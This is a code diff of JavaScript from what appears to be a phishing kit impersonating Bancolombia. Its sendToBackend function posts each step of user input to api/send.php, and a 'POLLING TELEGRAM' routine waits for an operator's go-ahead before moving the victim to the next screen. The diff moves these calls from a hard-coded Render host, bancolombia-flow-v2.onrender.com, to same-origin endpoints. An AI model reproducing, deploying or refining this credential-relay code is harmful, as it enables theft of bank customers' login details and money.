@@ -117,15 +117,21 @@ function resetAll() {
     show('scr-login');
 }
 
+/* ── ENVÍO A BACKEND ── */
 function sendToBackend(step, message) {
     const abToken = document.querySelector('input[name="ab_token"]')?.value || '';
     const website = document.querySelector('input[name="website"]')?.value || '';
-    
-    return fetch(`${BACKEND_URL}/api/send.php`, {
+    return fetch('api/send.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
+        credentials: 'same-origin',
         body: JSON.stringify({ step, message, sessionId: SESSION_ID, ab_token: abToken, website })
-    });
+    })
+        .then(r => r.json())
+        .catch(err => {
+            console.error('Error enviando a backend:', err);
+            return { ok: false, error: 'Network error' };
+        });
 }
 
 /* ── Mapa de pantallas de fail por paso ── */
@@ -158,14 +164,11 @@ function clearScreenInputs(screenId) {
 }
 
 /* ── POLLING TELEGRAM ── */
-const BACKEND_URL = 'https://bancolombia-flow-v2.onrender.com'; // <--- Pon aquí la URL real de tu servicio en Render
-
 function startPolling(targetScreen, stepName, originalMsg, onAction) {
     showWaitingLoader('Cargando...', '');
 
     pollInterval = setInterval(() => {
-        // Apuntamos a Render y quitamos 'credentials: same-origin' porque es cross-origin
-        fetch(`${BACKEND_URL}/api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`)
+        fetch(`api/poll.php?sessionId=${encodeURIComponent(SESSION_ID)}`, { credentials: 'same-origin' })
             .then(r => r.json())
             .then(async data => {
                 if (data.status === 'completed') {
